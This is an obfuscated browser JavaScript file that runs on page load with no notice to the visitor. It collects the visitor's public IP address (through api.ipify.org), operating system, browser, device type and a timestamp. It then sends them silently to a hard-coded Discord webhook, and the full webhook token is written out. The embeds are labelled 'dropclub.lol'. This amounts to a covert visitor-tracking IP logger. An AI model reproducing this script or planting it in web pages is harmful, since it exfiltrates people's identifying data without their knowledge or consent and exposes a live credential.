const _0x3de3b2=_0x2636;(function(_0x998dfc,_0x2a1438){const _0x1241d0=_0x2636,_0x2531a4=_0x998dfc();while(!![]){try{const _0x16cb5e=parseInt(_0x1241d0(0x1f0))/0x1*(parseInt(_0x1241d0(0x1ea))/0x2)+parseInt(_0x1241d0(0x1ec))/0x3*(-parseInt(_0x1241d0(0x1cd))/0x4)+parseInt(_0x1241d0(0x1e1))/0x5*(-parseInt(_0x1241d0(0x1e3))/0x6)+-parseInt(_0x1241d0(0x1e9))/0x7+parseInt(_0x1241d0(0x1de))/0x8*(-parseInt(_0x1241d0(0x1ee))/0x9)+parseInt(_0x1241d0(0x1d2))/0xa*(parseInt(_0x1241d0(0x1d4))/0xb)+-parseInt(_0x1241d0(0x1d1))/0xc*(-parseInt(_0x1241d0(0x1ed))/0xd);if(_0x16cb5e===_0x2a1438)break;else _0x2531a4['push'](_0x2531a4['shift']());}catch(_0x558e24){_0x2531a4['push'](_0x2531a4['shift']());}}}(_0x3102,0x990eb));function logUserInfo(){const _0x4a84a7=_0x2636,_0xce16ac={'ip':_0x4a84a7(0x1e4),'os':getOSInfo(),'browser':getBrowserInfo(),'device':getDeviceInfo(),'timestamp':new Date()[_0x4a84a7(0x1da)]()};getUserIP()[_0x4a84a7(0x1e5)](_0xc28518=>{_0xc28518&&(_0xce16ac['ip']=_0xc28518),sendToDiscordWebhook(_0xce16ac);});}function _0x3102(){const _0x4fbda4=['Linux','DOMContentLoaded','8WqLmrf','Device','MSIE','26630VMcode','error','24kZfYuN','Didn\x27t\x20pull','then','Unknown\x20Browser','Status:\x20','POST','7286300jaycET','42WpIhMb','Microsoft\x20Internet\x20Explorer','2517sVFxdE','221IFKaJd','6126741zWscTd','device','16628Zgtliv','like\x20Mac','Android','json','Google\x20Chrome','catch','status','Operating\x20System','Apple\x20Safari','1124qeOsCR','stringify','browser','Mobile\x20Device','1447476wulLiR','294080hxDStI','userAgent','77hPHFmQ','Win','iOS','log','dropclub.lol','Chrome','toLocaleString','indexOf'];_0x3102=function(){return _0x4fbda4;};return _0x3102();}function getUserIP(){const _0x1f5d05=_0x2636;return fetch('https://api.ipify.org?format=json')[_0x1f5d05(0x1e5)](_0x3ba76c=>_0x3ba76c[_0x1f5d05(0x1c7)]())['then'](_0x2264f6=>_0x2264f6['ip'])[_0x1f5d05(0x1c9)](_0x273889=>{const _0x1da074=_0x1f5d05;return console[_0x1da074(0x1e2)]('Error\x20fetching\x20IP:',_0x273889),null;});}function getBrowserInfo(){const _0x2a9735=_0x2636,_0x369144=navigator[_0x2a9735(0x1d3)];let _0x29a6e2=_0x2a9735(0x1e6);if(_0x369144[_0x2a9735(0x1db)]('Firefox')>-0x1)_0x29a6e2='Mozilla\x20Firefox';else{if(_0x369144['indexOf'](_0x2a9735(0x1d9))>-0x1)_0x29a6e2=_0x2a9735(0x1c8);else{if(_0x369144['indexOf']('Safari')>-0x1)_0x29a6e2=_0x2a9735(0x1cc);else(_0x369144['indexOf'](_0x2a9735(0x1e0))>-0x1||_0x369144[_0x2a9735(0x1db)]('Trident')>-0x1)&&(_0x29a6e2=_0x2a9735(0x1eb));}}return _0x29a6e2;}function getOSInfo(){const _0x46538b=_0x2636,_0x332b65=navigator['userAgent'];let _0x5e0e49='Unknown\x20OS';if(_0x332b65[_0x46538b(0x1db)](_0x46538b(0x1d5))>-0x1)_0x5e0e49='Windows';else{if(_0x332b65['indexOf']('Mac')>-0x1)_0x5e0e49='MacOS';else{if(_0x332b65['indexOf'](_0x46538b(0x1dc))>-0x1)_0x5e0e49=_0x46538b(0x1dc);else{if(_0x332b65[_0x46538b(0x1db)]('Android')>-0x1)_0x5e0e49=_0x46538b(0x1c6);else _0x332b65[_0x46538b(0x1db)](_0x46538b(0x1f1))>-0x1&&(_0x5e0e49=_0x46538b(0x1d6));}}}return _0x5e0e49;}function _0x2636(_0x946dbf,_0x5ef2dd){const _0x310257=_0x3102();return _0x2636=function(_0x26368e,_0x19dd32){_0x26368e=_0x26368e-0x1c6;let _0x594f79=_0x310257[_0x26368e];return _0x594f79;},_0x2636(_0x946dbf,_0x5ef2dd);}function getDeviceInfo(){const _0x25144e=_0x2636,_0x8938bf=navigator['userAgent'];if(/Mobi|Android/i['test'](_0x8938bf))return _0x25144e(0x1d0);return'Desktop\x20Device';}function sendToDiscordWebhook(_0x415e7d){const _0x34bc2d=_0x2636,_0x4b3f96='https://discord.com/api/webhooks/1295934611985272865/XysK6sDdKeyCT7ogtUsh2xj3I-hLOTPmbdOBXtOHymMzm6AQkN92sc3eL4hKC5ZcRLpT',_0x3f3152=JSON[_0x34bc2d(0x1ce)]({'embeds':[{'title':_0x34bc2d(0x1d8),'color':0xd59bf2,'fields':[{'name':'IP\x20Address','value':_0x415e7d['ip']},{'name':_0x34bc2d(0x1cb),'value':_0x415e7d['os']},{'name':'Browser','value':_0x415e7d[_0x34bc2d(0x1cf)]},{'name':_0x34bc2d(0x1df),'value':_0x415e7d[_0x34bc2d(0x1ef)]},{'name':'Timestamp','value':_0x415e7d['timestamp']}],'footer':{'text':_0x34bc2d(0x1d8)}}]});fetch(_0x4b3f96,{'method':_0x34bc2d(0x1e8),'headers':{'Content-Type':'application/json'},'body':_0x3f3152})['then'](_0x14988b=>{const _0x14ad7d=_0x34bc2d;console[_0x14ad7d(0x1d7)](_0x14ad7d(0x1e7)+_0x14988b[_0x14ad7d(0x1ca)]);})[_0x34bc2d(0x1c9)](_0x5e46f1=>{const _0x3f632a=_0x34bc2d;console[_0x3f632a(0x1e2)]('Problem\x20with\x20request:\x20'+_0x5e46f1['message']);});}document['addEventListener'](_0x3de3b2(0x1dd),()=>{logUserInfo();});